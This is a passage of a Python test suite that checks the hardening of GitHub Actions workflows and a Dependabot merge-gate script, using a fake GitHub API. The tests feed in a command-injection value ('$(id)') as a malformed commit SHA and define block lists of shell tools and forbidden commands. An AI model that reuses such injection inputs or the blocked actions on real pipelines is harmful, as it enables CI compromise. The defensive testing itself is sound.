        copy_at = lines.index("cp trusted/.dockerignore source/.dockerignore")
        build_at = lines.index('docker build --platform linux/amd64 -f trusted/build/bencher/Dockerfile -t "$image" source')
        self.assertLess(copy_at, build_at)
        for step in job["steps"]:
            text = step.get("run", "")
            self.assertIsNone(shell.search(text), text)
            for path in re.findall(r"^\s*source (\S+)", text, re.MULTILINE):
                self.assertTrue(path.startswith("trusted/"), path)
            self.assertNotIn("source/", text.replace("source/.dockerignore", ""))

    def test_test_report_job_runs_no_pull_request_code(self) -> None:
        doc = self.workflow_files()["ci.yml"]
        test, report = doc["jobs"]["test"], doc["jobs"]["test-report"]
        self.assertFalse(self.may_write_checks(doc, test))
        self.assertEqual(report["permissions"], {"actions": "read", "checks": "write"})
        self.assertEqual(report["needs"], "test")
        self.assertEqual(report["if"], "${{ !cancelled() }}")
        self.assertNotIn("uses", report)
        self.assertNotIn("services", report)
        self.assertNotIn("container", report)
        # One report job per test leg, with the same (os, engine) keys and the same check name as before.
        legs = sorted((leg["os"], leg.get("engine", "")) for leg in test["strategy"]["matrix"]["include"])
        self.assertEqual(sorted((leg["os"], leg.get("engine", "")) for leg in report["strategy"]["matrix"]["include"]), legs)
        self.assertEqual(len(legs), 4)
        self.assertEqual([sorted(step) for step in report["steps"]], [["name", "uses", "with"]] * 2)
        download, junit = report["steps"]
        self.assertEqual(download["uses"], "actions/download-artifact@v8")
        self.assertEqual(junit["uses"], "mikepenz/action-junit-report@v6")
        (upload,) = [step for step in test["steps"] if step.get("name") == "Upload test results"]
        self.assertEqual(upload["if"], "always()")
        self.assertEqual(download["with"], {"name": upload["with"]["name"], "path": "test-results"})
        self.assertEqual(junit["with"]["report_paths"], "test-results/*.xml")
        self.assertEqual(junit["with"]["check_name"], "JUnit Report (${{ matrix.os }}${{ matrix.engine && format(' / {0}', matrix.engine) || '' }})")
        self.assertEqual(report["name"], test["name"].replace("Test (", "Test Report (", 1))
        self.assertFalse(any("mikepenz/action-junit-report" in str(step.get("uses")) for step in test["steps"]))

    def test_pgo_profile_commit_runs_no_pull_request_code(self) -> None:
        doc = self.workflow_files()["ci.yml"]
        sanity, commit = doc["jobs"]["pgo-sanity"], doc["jobs"]["pgo-commit"]
        # PGO Sanity runs the pull request's code with a read-only token that it does not persist.
        self.assertEqual(sanity["permissions"], {"contents": "read"})
        checkouts = [step for step in sanity["steps"] if str(step.get("uses", "")).startswith("actions/checkout@")]
        self.assertEqual(len(checkouts), 1)
        self.assertEqual(checkouts[0]["with"].get("persist-credentials"), "false")
        self.assertEqual(sanity["steps"][1], {
            "name": "Record checked-out head", "id": "head", "shell": "bash", "run": 'echo "sha=$(git rev-parse HEAD)" >> "$GITHUB_OUTPUT"',
        })
        self.assertEqual(sanity["outputs"], {
            "needs_refresh": "${{ steps.pgo-check.outputs.needs_refresh }}", "head_sha": "${{ steps.head.outputs.sha }}",
        })
        (upload,) = [step for step in sanity["steps"] if str(step.get("uses", "")).startswith("actions/upload-artifact@")]
        self.assertEqual(upload["uses"], "actions/upload-artifact@v7")
        self.assertEqual(upload["if"], "steps.pgo-check.outputs.needs_refresh == 'true'")
        self.assertEqual(upload["with"]["name"], "pgo-profile")
        self.assertEqual(upload["with"]["path"], "default.pgo")
        self.assertFalse(any("createCommitOnBranch" in step.get("run", "") or "GH_TOKEN" in step.get("env", {}) for step in sanity["steps"]))
        # PGO Profile Commit: same-repository pull requests only, after a regeneration, and no checkout.
        self.assertEqual(commit["permissions"], {"contents": "write"})
        self.assertEqual(commit["needs"], "pgo-sanity")
        self.assertEqual(commit["if"].split("\n"), [
            "needs.pgo-sanity.outputs.needs_refresh == 'true'",
            "&& github.event_name == 'pull_request'",
            "&& github.event.pull_request.head.repo.full_name == github.repository",
            "&& github.event.pull_request.user.login != 'dependabot[bot]'",
        ])
        # Dependabot's pull_request runs get the declared write permissions, so its PRs never reach the job.
        for key in ("env", "continue-on-error"):
            self.assertNotIn(key, commit)
        for key in ("uses", "services", "container", "defaults"):
            self.assertNotIn(key, commit)
        uses = [step["uses"] for step in commit["steps"] if "uses" in step]
        self.assertEqual(uses, ["actions/download-artifact@v8"])
        download = commit["steps"][0]
        self.assertEqual(download["with"], {"name": upload["with"]["name"], "path": "${{ runner.temp }}/pgo-profile"})
        shell = re.compile(r"(?:^|[\s;|&(])(?:go|npm|npx|node|make|yarn|pnpm|python3?|bash|sh|git|source|\.)\s", re.MULTILINE)
        runs = [step for step in commit["steps"] if "run" in step]
        self.assertEqual(len(runs), 2)
        for step in runs:
            with self.subTest(step=step["name"]):
                self.assertEqual(sorted(step), ["env", "name", "run", "shell"])
                self.assertEqual(step["shell"], "bash")
                self.assertIsNone(shell.search(step["run"]), step["run"])
                self.assertNotIn("./", step["run"])
                self.assertNotIn("GITHUB_WORKSPACE", step["run"])
        verify, write = runs
        self.assertIn('if [ "$entries" != "default.pgo" ]', verify["run"])
        self.assertIn('if [ -L "$profile" ] || [ ! -f "$profile" ]', verify["run"])
        self.assertNotIn("GH_TOKEN", verify["env"])
        # The commit goes to the pull request's own head branch, on top of the head PGO Sanity checked out.
        self.assertEqual(write["env"]["HEAD_BRANCH"], "${{ github.head_ref }}")
        self.assertEqual(write["env"]["EXPECTED_HEAD"], "${{ needs.pgo-sanity.outputs.head_sha }}")
        self.assertEqual(write["env"]["GH_TOKEN"], "${{ github.token }}")
        self.assertIn('if [ "$CURRENT_HEAD" != "$EXPECTED_HEAD" ]; then', write["run"])
        self.assertIn('additions: [{path: "default.pgo", contents: $contents}]', write["run"])
        self.assertIn("expectedHeadOid: $oid", write["run"])
        self.assertIn('--arg oid "$EXPECTED_HEAD"', write["run"])
        self.assertIn('--arg branch "$HEAD_BRANCH"', write["run"])
        self.assertNotIn("deletions", write["run"])
        self.assertNotIn("force", write["run"])

    def test_ignored_checks_are_job_names(self) -> None:
        docs = workflow_docs()
        names = {"Track Benchmarks": "Benchmarks", "Dependabot merge gate": "Dependabot Gate"}
        self.assertEqual(set(names), {name for name, _ in GATE.IGNORED_CHECKS})
        for check, workflow in names.items():
            self.assertIn(check, [job.get("name") for job in docs[workflow]["jobs"].values()])

    def test_glob_and_name_matching(self) -> None:
        self.assertTrue(glob_matches("website/**", "website/package-lock.json"))
        self.assertTrue(glob_matches("go.mod", "go.mod"))
        self.assertFalse(glob_matches("*.go", "go.mod"))
        self.assertFalse(glob_matches("*.go", "cmd/main.go"))
        self.assertTrue(name_matches("Build (${{ matrix.os }}/${{ matrix.arch }})", "Build (linux/amd64)"))
        self.assertFalse(name_matches("Build (${{ matrix.os }}/${{ matrix.arch }})", "Test (windows)"))
        self.assertFalse(name_matches("govulncheck", "govulncheck (all)"))


class GateWorkflowTests(unittest.TestCase):
    def setUp(self) -> None:
        self.text = GATE_WORKFLOW.read_text(encoding="utf-8")
        self.doc = load_yaml(self.text)
        (self.job,) = self.doc["jobs"].values()
        self.steps = {step["name"]: step for step in self.job["steps"]}

    def test_runs_only_on_workflow_run_of_the_required_workflows(self) -> None:
        self.assertEqual(list(self.doc["on"]), ["workflow_run"])
        trigger = self.doc["on"]["workflow_run"]
        self.assertEqual(trigger["types"], ["completed"])
        required = {check.workflow for eco in GATE.ECOSYSTEMS for check in eco.required if check not in GATE.REQUIRED_EXTERNAL}
        self.assertEqual(sorted(trigger["workflows"]), sorted(required))
        self.assertEqual(required, set(GATE.WORKFLOW_FILES))
        self.assertEqual(set(trigger), {"workflows", "types"})

    def test_mode_is_a_constant_and_decide_only(self) -> None:
        self.assertEqual(self.doc["env"], {"GATE_MODE": "decide-only"})
        self.assertIn(self.doc["env"]["GATE_MODE"], GATE.MODES)
        self.assertNotIn("env", self.job)
        for step in self.job["steps"]:
            self.assertNotIn("GATE_MODE", step.get("env", {}), step["name"])
        self.assertNotIn("vars.GATE_MODE", self.text)

    def test_token_is_read_only(self) -> None:
        self.assertEqual(str(self.doc["permissions"]), "{}")
        self.assertEqual(
            self.job["permissions"],
            {"actions": "read", "contents": "read", "pull-requests": "read", "checks": "read", "statuses": "read"},
        )

    def test_job_filters_on_dependabot_pull_request_runs(self) -> None:
        condition = " ".join(self.job["if"].split())
        self.assertEqual(
            condition.split(" && "),
            [
                "github.event.workflow_run.event == 'pull_request'",
                f"github.event.workflow_run.actor.id == {GATE.DEPENDABOT[1]}",
                "github.event.workflow_run.head_repository.id == github.event.repository.id",
            ],
        )
        # Ids, not logins; and a maintainer's re-run (triggering_actor) must
        # still be evaluated, so that field is not read.
        self.assertNotIn("||", condition)
        self.assertNotIn(".login", condition)
        self.assertNotIn("full_name", condition)
        self.assertNotIn("triggering_actor", condition)
        self.assertIn((self.job["name"], GATE.ACTIONS_APP), GATE.IGNORED_CHECKS)

    def test_one_evaluation_per_head_commit(self) -> None:
        self.assertEqual(
            self.doc["concurrency"],
            {"group": "dependabot-gate-${{ github.event.workflow_run.head_sha }}", "cancel-in-progress": "false"},
        )

    def test_never_checks_out_pull_request_code(self) -> None:
        checkouts = [step for step in self.job["steps"] if step.get("uses", "").startswith("actions/checkout@")]
        self.assertEqual(len(checkouts), 1)
        self.assertEqual(
            checkouts[0]["with"],
            {
                "persist-credentials": "false",
                "sparse-checkout": "scripts/dependabot-gate.py",
                "sparse-checkout-cone-mode": "false",
            },
        )
        self.assertNotIn("github.event.workflow_run.head_branch", self.text)
        for step in self.job["steps"]:
            self.assertNotRegex(step.get("run", ""), r"\bgit\b|gh pr checkout|gh run download|\bcurl\b|\bnpm\b|\bgo\b|\bmake\b")

    def test_actions_use_the_majors_of_the_other_workflows(self) -> None:
        pins: dict[str, set[str]] = {}
        for path in WORKFLOWS.glob("*.yml"):
            if path != GATE_WORKFLOW:
                for action, ref in re.findall(r"uses: ([\w./-]+)@(\S+)", path.read_text(encoding="utf-8")):
                    pins.setdefault(action, set()).add(ref)
        used = [step["uses"].split("@") for step in self.job["steps"] if "uses" in step]
        self.assertEqual(sorted(action for action, _ in used), ["actions/checkout", "actions/create-github-app-token"])
        for action, ref in used:
            self.assertEqual(pins[action], {ref}, action)
            self.assertRegex(ref, r"^v\d+$")

    def test_event_values_never_reach_a_shell_as_text(self) -> None:
        for step in self.job["steps"]:
            self.assertNotIn("${{", step.get("run", ""), step["name"])
        decide = self.steps["Decide"]
        self.assertEqual(
            decide["env"],
            {
                "GH_TOKEN": "${{ github.token }}",
                "GATE_REPOSITORY": "${{ github.repository }}",
                "GATE_HEAD_SHA": "${{ github.event.workflow_run.head_sha }}",
            },
        )
        self.assertTrue(decide["run"].startswith("python3 -I scripts/dependabot-gate.py gate "))
        self.assertNotIn("if", decide)
        self.assertNotIn("continue-on-error", self.text)

    def test_app_token_and_merge_need_merge_mode_and_a_merge_verdict(self) -> None:
        names = [step["name"] for step in self.job["steps"]]
        self.assertEqual(
            names,
            ["Checkout the decision script from main", "Decide", "Mint the merge App token", "Squash-merge the pull request"],
        )
        self.assertEqual(self.steps["Decide"]["id"], "decide")
        for name in names[:2]:
            dumped = json.dumps(self.steps[name])
            for needle in ("secrets.", "vars.", "app-token", "create-github-app-token", "gh pr merge", "write"):
                self.assertNotIn(needle, dumped, name)
        for name in names[2:]:
            self.assertEqual(self.steps[name]["if"], GUARD, name)
        self.assertNotEqual(self.doc["env"]["GATE_MODE"], "merge")
        mint, merge = self.steps[names[2]], self.steps[names[3]]
        self.assertEqual(mint["id"], "app-token")
        self.assertEqual(
            mint["with"],
            {
                "app-id": "${{ vars.DEPENDABOT_MERGE_APP_ID }}",
                "private-key": "${{ secrets.DEPENDABOT_MERGE_APP_PRIVATE_KEY }}",
                "permission-contents": "write",
                "permission-pull-requests": "write",
            },
        )
        self.assertEqual(merge["env"]["GH_TOKEN"], "${{ steps.app-token.outputs.token }}")
        # The last look at main comes first, in the same step, and the shell
        # stops on its failure.
        self.assertEqual(
            " ".join(merge["run"].replace("\\\n", " ").split()),
            'set -e python3 -I scripts/dependabot-gate.py up-to-date --repo "$GATE_REPOSITORY" --head-sha "$GATE_HEAD_SHA" '
            'gh pr merge "$GATE_PR_NUMBER" --repo "$GATE_REPOSITORY" --squash --match-head-commit "$GATE_HEAD_SHA"',
        )
        self.assertEqual(merge["run"].split("\n")[0], "set -e")
        self.assertNotIn("||", merge["run"])
        self.assertNotIn("shell", merge)
        code = "\n".join(line for line in self.text.splitlines() if not line.lstrip().startswith("#"))
        self.assertEqual(code.count("secrets."), 1)
        self.assertEqual(code.count("steps.app-token.outputs.token"), 1)
        for forbidden in ("gh pr review", "gh pr comment", "gh pr edit", "gh api", "--admin", "--auto", "pull_request_target"):
            self.assertNotIn(forbidden, code)


class DependabotConfigTests(unittest.TestCase):
    GROUP_OPTIONS = {"applies-to", "dependency-type", "exclude-patterns", "group-by", "patterns", "update-types"}
    EXTRA_EXCLUDES = {"gomod": {"github.com/coder/acp-go-sdk", "github.com/openai/openai-go/v3"}, "npm": set()}

    def setUp(self) -> None:
        self.doc = load_yaml(DEPENDABOT_CONFIG.read_text(encoding="utf-8"))
        self.updates = {update["package-ecosystem"]: update for update in self.doc["updates"]}

    def test_parses_like_a_full_yaml_reader(self) -> None:
        # Every other test here reads the file with the repository's own
        # block-YAML reader; this one checks that reader against PyYAML.
        try:
            import yaml
        except ImportError:
            self.skipTest("PyYAML is not installed: the comparison with a full YAML reader did not run")

        def text(value: object) -> object:
            if isinstance(value, dict):
                return {str(key): text(child) for key, child in value.items()}
            if isinstance(value, list):
                return [text(child) for child in value]
            return str(value)

        self.assertEqual(text(yaml.safe_load(DEPENDABOT_CONFIG.read_text(encoding="utf-8"))), text(self.doc))

    def test_keeps_the_schedule_labels_and_prefixes(self) -> None:
        self.assertEqual(self.doc["version"], "2")
        self.assertEqual(
            {name: (update["directory"], update["commit-message"]["prefix"], update["labels"]) for name, update in self.updates.items()},
            {
                "gomod": ("/", "deps(go)", ["dependencies", "go"]),
                "npm": ("/website", "deps(npm)", ["dependencies", "website"]),
                "github-actions": ("/", "deps(actions)", ["dependencies", "ci"]),
            },
        )
        for update in self.doc["updates"]:
            self.assertEqual(update["schedule"], {"interval": "weekly", "day": "monday", "time": "09:00", "timezone": "UTC"})

    def test_limits_leave_room_for_the_group_pull_request(self) -> None:
        # Every excluded dependency gets a pull request of its own, and most
        # never merge here: they must not use up the limit (finding M3).
        for eco in GATE.ECOSYSTEMS:
            update = self.updates[eco.name]
            (group,) = update["groups"].values()
            self.assertGreaterEqual(int(update["open-pull-requests-limit"]), len(group["exclude-patterns"]) + 1 + 5, eco.name)
        self.assertEqual(self.updates["github-actions"]["open-pull-requests-limit"], "5")

    def test_cooldown_is_explicit(self) -> None:
        # Options: GitHub Docs, Dependabot options reference, `cooldown`
        # (version updates only; days between 1 and 90; `default-days` is the
        # one option all three ecosystems support).
        for update in self.doc["updates"]:
            with self.subTest(ecosystem=update["package-ecosystem"]):
                self.assertEqual(update["cooldown"], {"default-days": "7"})
                self.assertTrue(1 <= int(update["cooldown"]["default-days"]) <= 90)

    def test_updates_use_documented_options(self) -> None:
        options = {"package-ecosystem", "directory", "schedule", "open-pull-requests-limit", "cooldown", "groups", "commit-message", "labels"}
        for update in self.doc["updates"]:
            self.assertEqual(set(update), options, update["package-ecosystem"])

    def test_groups_use_documented_options(self) -> None:
        for update in self.doc["updates"]:
            for name, group in update["groups"].items():
                with self.subTest(group=name):
                    self.assertRegex(name, r"^[A-Za-z]([A-Za-z|_-]*[A-Za-z])?$")
                    self.assertLessEqual(set(group), self.GROUP_OPTIONS)
                    self.assertIn(group.get("applies-to", "version-updates"), ("version-updates", "security-updates"))
                    self.assertLessEqual(set(group.get("update-types", [])), {"minor", "patch", "major"})
                    for key in ("patterns", "exclude-patterns", "update-types"):
                        self.assertIsInstance(group.get(key, []), list)

    def test_gate_ecosystems_group_patch_and_minor_only(self) -> None:
        for eco in GATE.ECOSYSTEMS:
            groups = self.updates[eco.name]["groups"]
            self.assertEqual(len(groups), 1, eco.name)
            for group in groups.values():
                self.assertEqual(sorted(group["update-types"]), ["minor", "patch"], eco.name)

    def test_groups_exclude_the_deny_list_and_the_fast_sdks(self) -> None:
        for eco in GATE.ECOSYSTEMS:
            for group_name, group in self.updates[eco.name]["groups"].items():
                excludes = group["exclude-patterns"]
                for name in list(eco.deny) + sorted(self.EXTRA_EXCLUDES[eco.name]):
                    with self.subTest(group=group_name, dependency=name):
                        self.assertTrue(any(fnmatch.fnmatchcase(name, pattern) for pattern in excludes), f"{name} is not excluded")
                self.assertEqual(set(excludes), set(eco.deny) | self.EXTRA_EXCLUDES[eco.name], "an exclude with no stated reason")

    def test_excluded_names_are_still_dependencies(self) -> None:
        go_mod = (ROOT / "go.mod").read_text(encoding="utf-8")
        for name in self.EXTRA_EXCLUDES["gomod"]:
            self.assertRegex(go_mod, rf"(?m)^\t{re.escape(name)} v\S+", name)


# ---------------------------------------------------------------- CLI layer


class FakeGitHub:
    """Serves one snapshot through the REST paths the script reads."""

    def __init__(self, snapshot: dict, pulls: list[dict] | None = None, mergeable_after: int = 0) -> None:
        self.snapshot = snapshot
        self.calls: list[str] = []
        self.raw_calls: list[str] = []
        self.pr_reads = 0
        self.mergeable_after = mergeable_after
        pr = snapshot["pull_request"]
        self.pulls = pulls if pulls is not None else [self.pull(pr["number"], pr["head"]["sha"])]

    @staticmethod
    def pull(
        number: int,
        sha: str,
        state: str = "open",
        repo: str = REPO,
        head_repo_id: object = REPO_ID,
        base_repo_id: object = REPO_ID,
        user_id: int = 49699333,
    ) -> dict:
        return {
            "number": number,
            "state": state,
            "user": {"login": "dependabot[bot]", "id": user_id},
            "head": {"sha": sha, "repo": {"id": head_repo_id}},
            "base": {"repo": {"full_name": repo, "id": base_repo_id}},
        }

    def __call__(self, path: str, raw: bool = False) -> object:
        self.calls.append(path)
        match = re.fullmatch(r"(.*?)[?&]per_page=100&page=(\d+)", path)
        route, page = (match.group(1), int(match.group(2))) if match else (path, 1)
        window = slice((page - 1) * 100, page * 100)
        pr = self.snapshot["pull_request"]
        sha, base = pr["head"]["sha"], f"repos/{REPO}/pulls/{pr['number']}"
        compare = self.snapshot["compare"]
        if raw:
            # The contents API, asked for the file itself.
            self.raw_calls.append(path)
            for entry in self.snapshot["files"]:
                for side, ref in (("base", compare["merge_base_sha"]), ("head", sha)):
                    if path == f"repos/{REPO}/contents/{entry['filename']}?ref={ref}":
                        return entry[side]
            raise AssertionError(f"unexpected raw API path: {path}")
        if re.fullmatch(rf"repos/{REPO}/commits/[0-9a-f]{{40}}/pulls", route):
            return self.pulls[window]
        if route == base:
            self.pr_reads += 1
            return {**pr, "mergeable": pr["mergeable"] if self.pr_reads > self.mergeable_after else None, "title": "x"}
        if route == f"repos/{REPO}/compare/main...{sha}?per_page=1":
            return {
                "status": "ahead",
                "ahead_by": 1,
                "behind_by": compare["behind_by"],
                "merge_base_commit": {"sha": compare["merge_base_sha"], "commit": {"message": "x"}},
                "commits": [],
            }
        if route == f"{base}/commits":
            return [{**commit, "url": "x"} for commit in self.snapshot["commits"]][window]
        if route == f"{base}/files":
            listed = [{key: value for key, value in entry.items() if key not in ("base", "head")} for entry in self.snapshot["files"]]
            return [{"patch": "@@ -1 +1 @@", **entry, "sha": "x"} for entry in listed][window]
        if route == f"repos/{REPO}/commits/{sha}/check-runs?filter=latest":
            runs = self.snapshot["check_runs"]
            return {"total_count": len(runs), "check_runs": [{**run, "external_id": "x"} for run in runs][window]}
        if route == f"repos/{REPO}/commits/{sha}/status":
            statuses = self.snapshot["statuses"]
            return {"state": "pending", "total_count": len(statuses), "statuses": statuses[window]}
        if route == f"repos/{REPO}/actions/runs?head_sha={sha}":
            runs = [{key: value for key, value in run.items() if key not in ("jobs", "check_runs")} for run in self.snapshot["workflow_runs"]]
            return {"total_count": len(runs), "workflow_runs": [{**run, "triggering_actor": {"id": 1}} for run in runs][window]}
        jobs = re.fullmatch(rf"repos/{REPO}/actions/runs/(\d+)/jobs\?filter=all", route)
        if jobs:
            # Only the runs whose snapshot entry has jobs may be asked for them.
            (run,) = [run for run in self.snapshot["workflow_runs"] if run["id"] == int(jobs.group(1)) and "jobs" in run]
            listed = [
                {**job, "name": "x", "run_id": run["id"], "steps": [{"name": "x", "number": 1, "conclusion": step} for step in job["steps"]]}
                for job in run["jobs"]
            ]
            return {"total_count": len(listed), "jobs": listed[window]}
        suite = re.fullmatch(rf"repos/{REPO}/check-suites/(\d+)/check-runs\?filter=all", route)
        if suite:
            (run,) = [run for run in self.snapshot["workflow_runs"] if run["check_suite_id"] == int(suite.group(1)) and "check_runs" in run]
            listed = [{**check, "external_id": "x"} for check in run["check_runs"]]
            return {"total_count": len(listed), "check_runs": listed[window]}
        raise AssertionError(f"unexpected API path: {path}")


class CommandLineTests(unittest.TestCase):
    SHA = "862bccdff65c5b51281858c8c9c6b2f716c032b0"

    def gate(self, api: object, *argv: str) -> tuple[int, dict, str, dict[str, str], str]:
        """Run `gate`; return (rc, verdict, stderr, GITHUB_OUTPUT pairs, summary file)."""
        with tempfile.TemporaryDirectory() as tmp:
            output, summary = Path(tmp) / "output", Path(tmp) / "summary"
            out, err = io.StringIO(), io.StringIO()
            with (
                mock.patch.object(GATE, "gh_api", api),
                mock.patch.object(GATE.time, "sleep") as sleep,
                contextlib.redirect_stdout(out),
                contextlib.redirect_stderr(err),
            ):
                rc = GATE.main(["gate", "--repo", REPO, *argv, "--summary", str(summary), "--github-output", str(output)])
            self.sleeps = sleep.call_count
            pairs = dict(line.split("=", 1) for line in output.read_text().splitlines()) if output.exists() else {}
            return rc, json.loads(out.getvalue()), err.getvalue(), pairs, summary.read_text() if summary.exists() else ""

    def test_merge_verdict_through_the_api(self) -> None:
        api = FakeGitHub(green_gomod())
        rc, verdict, err, outputs, summary = self.gate(api, "--head-sha", self.SHA, "--mode", "decide-only")
        self.assertEqual((rc, verdict["decision"], verdict["reasons"]), (0, "merge", []))
        self.assertEqual(outputs, {"decision": "merge", "pr_number": "190", "head_sha": self.SHA})
        self.assertIn("### Dependabot merge gate: MERGE", summary)
        self.assertIn("- Mode: decide-only: the workflow merges nothing in this mode", summary)
        self.assertEqual(summary, err)
        self.assertTrue(all(call.startswith(f"repos/{REPO}/") for call in api.calls))
        # The base contents are read at the merge base, the head's at the head.
        self.assertEqual(
            api.raw_calls,
            [f"repos/{REPO}/contents/go.mod?ref=f895970f71f3fedaa1dfdde78e6f19cde5ab9e1c", f"repos/{REPO}/contents/go.mod?ref={self.SHA}"],
        )
        self.assertIn(f"repos/{REPO}/compare/main...{self.SHA}?per_page=1", api.calls)
        # The jobs are read for the four runs a required check can come from, not for benchmarks.yml.
        required_runs = sorted(run["id"] for run in green_gomod()["workflow_runs"] if run["path"] in GATE.REQUIRED_WORKFLOW_PATHS)
        self.assertEqual(len(required_runs), 4)
        self.assertEqual(
            sorted(call for call in api.calls if "/jobs?" in call),
            [f"repos/{REPO}/actions/runs/{run}/jobs?filter=all&per_page=100&page=1" for run in required_runs],
        )
        suites = sorted(run["check_suite_id"] for run in green_gomod()["workflow_runs"] if run["path"] in GATE.REQUIRED_WORKFLOW_PATHS)
        self.assertEqual(
            sorted(call for call in api.calls if "/check-suites/" in call),
            [f"repos/{REPO}/check-suites/{suite}/check-runs?filter=all&per_page=100&page=1" for suite in suites],
        )
        self.assertEqual(verdict["admitted"], [])

    def test_npm_merge_verdict_through_the_api(self) -> None:
        snapshot = green_npm()
        api = FakeGitHub(snapshot)
        rc, verdict, _, outputs, _ = self.gate(api, "--head-sha", snapshot["head_sha"])
        self.assertEqual((rc, verdict["decision"], verdict["reasons"], outputs["pr_number"]), (0, "merge", [], "189"))
        self.assertEqual(len(api.raw_calls), 4)

    def test_snapshot_keeps_exactly_the_fixture_fields(self) -> None:
        for snapshot in (real(189), real(190), real(191), green_gomod(), green_npm()):
            with self.subTest(pr=snapshot["pull_request"]["number"]):
                sha = snapshot["pull_request"]["head"]["sha"]
                self.assertEqual(GATE.build_snapshot(FakeGitHub(snapshot), REPO, snapshot["pull_request"]["number"], sha), snapshot)

    def test_contents_are_read_only_for_modified_files_with_a_content_rule(self) -> None:
        snapshot = green_gomod()
        file_entry(snapshot, GO_MOD)["status"] = "added"  # no base to read
        del file_entry(snapshot, GO_MOD)["base"], file_entry(snapshot, GO_MOD)["head"]
        api = FakeGitHub(snapshot)
        rc, verdict, _, _, _ = self.gate(api, "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["decision"], api.raw_calls), (0, "hold", []))
        self.assertIn("the base and head contents of go.mod could not be read", verdict["reasons"])
        snapshot = green_gomod()
        snapshot["compare"]["merge_base_sha"] = None
        del file_entry(snapshot, GO_MOD)["base"], file_entry(snapshot, GO_MOD)["head"]
        api = FakeGitHub(snapshot)
        rc, verdict, _, _, _ = self.gate(api, "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["decision"], api.raw_calls), (0, "hold", []))

    def test_missing_labels_hold_through_the_api(self) -> None:
        # Finding Low 3: a pull request body without `labels` became `[]`,
        # so the "labels could not be read" hold never fired on this path.
        for labels in ("missing", None, "hold", {"name": "hold"}):
            with self.subTest(labels=labels):
                snapshot = green_gomod()
                if labels == "missing":
                    del snapshot["pull_request"]["labels"]
                else:
                    snapshot["pull_request"]["labels"] = labels
                rc, verdict, _, outputs, _ = self.gate(FakeGitHub(snapshot), "--head-sha", self.SHA)
                self.assertEqual((rc, outputs["decision"], verdict["reasons"]), (0, "hold", ["the pull request labels could not be read"]))
        snapshot = green_gomod()
        snapshot["pull_request"]["labels"] = []
        rc, verdict, _, _, _ = self.gate(FakeGitHub(snapshot), "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["decision"]), (0, "merge"))

    def test_head_behind_main_holds_through_the_api(self) -> None:
        snapshot = green_gomod()
        snapshot["compare"]["behind_by"] = 2
        rc, verdict, _, outputs, _ = self.gate(FakeGitHub(snapshot), "--head-sha", self.SHA)
        self.assertEqual((rc, outputs["decision"]), (0, "hold"))
        self.assertEqual(len(verdict["reasons"]), 1)
        self.assertIn("the head is behind main (by 2)", verdict["reasons"][0])

    def test_real_pull_requests_hold_through_the_api(self) -> None:
        for number in (189, 190, 191):
            with self.subTest(pr=number):
                snapshot = real(number)
                rc, verdict, _, outputs, _ = self.gate(FakeGitHub(snapshot), "--head-sha", snapshot["head_sha"])
                self.assertEqual((rc, verdict["decision"], outputs["decision"]), (0, "hold", "hold"))
                self.assertEqual(verdict, GATE.decide(snapshot))

    def test_needs_exactly_one_open_pull_request_for_the_head(self) -> None:
        pull = FakeGitHub.pull
        cases = {
            "none": ([], 0),
            "two": ([pull(190, self.SHA), pull(192, self.SHA)], 2),
            "closed": ([pull(190, self.SHA, state="closed")], 0),
            "head moved": ([pull(190, "1" * 40)], 0),
            "another repository": ([pull(190, self.SHA, repo="mallory/invowk")], 0),
            "number is not an integer": ([pull("190", self.SHA)], 1),
            "from a fork": ([pull(190, self.SHA, head_repo_id=7)], 0),
            "head repository deleted": ([pull(190, self.SHA, head_repo_id=None)], 0),
            "no repository ids": ([pull(190, self.SHA, head_repo_id=None, base_repo_id=None)], 0),
            "not opened by the bot": ([pull(190, self.SHA, user_id=1)], 0),
        }
        for label, (pulls, found) in cases.items():
            with self.subTest(case=label):
                api = FakeGitHub(green_gomod(), pulls=pulls)
                rc, verdict, _, outputs, _ = self.gate(api, "--head-sha", self.SHA)
                self.assertEqual((rc, verdict["decision"]), (0, "hold"))
                self.assertEqual(
                    verdict["reasons"],
                    [f"expected exactly one open Dependabot pull request of this repository with head {self.SHA}, found {found}"],
                )
                self.assertEqual(outputs, {"decision": "hold", "pr_number": "", "head_sha": self.SHA})
                self.assertEqual(len(api.calls), 1)

    def test_outsider_pull_request_with_the_same_head_cannot_block(self) -> None:
        # Finding M3: anyone can open a fork pull request, or one from a
        # branch of their own, with Dependabot's head commit. It is not a
        # candidate, so the real pull request is still the one found.
        pull = FakeGitHub.pull
        outsiders = [pull(999, self.SHA, head_repo_id=7, user_id=1), pull(998, self.SHA, user_id=1), pull(997, self.SHA, head_repo_id=7)]
        for pulls in (outsiders + [pull(190, self.SHA)], [pull(190, self.SHA)] + outsiders):
            api = FakeGitHub(green_gomod(), pulls=pulls)
            rc, verdict, _, outputs, _ = self.gate(api, "--head-sha", self.SHA)
            self.assertEqual((rc, verdict["decision"], outputs["pr_number"]), (0, "merge", "190"))
        self.assertEqual(GATE.resolve_pull_request(lambda path: outsiders, REPO, self.SHA)[0], None)

    def test_malformed_head_sha_reads_nothing(self) -> None:
        for sha in ("main", "$(id)", "862bccd"):
            with self.subTest(sha=sha):
                api = FakeGitHub(green_gomod())
                rc, verdict, _, outputs, _ = self.gate(api, "--head-sha", sha)
                self.assertEqual((rc, verdict["decision"], api.calls), (0, "hold", []))
                self.assertEqual(outputs, {"decision": "hold", "pr_number": "", "head_sha": ""})

    def test_head_moved_after_the_run_holds(self) -> None:
        snapshot = green_gomod()
        api = FakeGitHub(snapshot, pulls=[FakeGitHub.pull(190, "1" * 40)])
        with mock.patch.object(GATE, "resolve_pull_request", return_value=(190, "")):
            rc, verdict, _, outputs, _ = self.gate(api, "--head-sha", "1" * 40)
        self.assertEqual((rc, outputs["decision"]), (0, "hold"))
        self.assertTrue(any("but the pull request head is now" in reason for reason in verdict["reasons"]))

    def test_unreadable_github_is_a_hold_and_a_failure(self) -> None:
        def broken(path: str, raw: bool = False) -> object:
            raise GATE.GateError("gh api failed: HTTP 502")

        rc, verdict, _, outputs, summary = self.gate(broken, "--head-sha", self.SHA)
        self.assertEqual((rc, verdict["decision"], outputs["decision"]), (1, "hold", "hold"))
        self.assertIn("GitHub could not be read, so nothing was decided", verdict["reasons"][0])
        self.assertIn("HOLD", summary)

    def test_reads_every_page(self) -> None:
        snapshot = green_gomod()
        extra = [
            {
                "id": i + 1,
                "name": f"extra {i}",
                "status": "completed",
                "conclusion": "success",
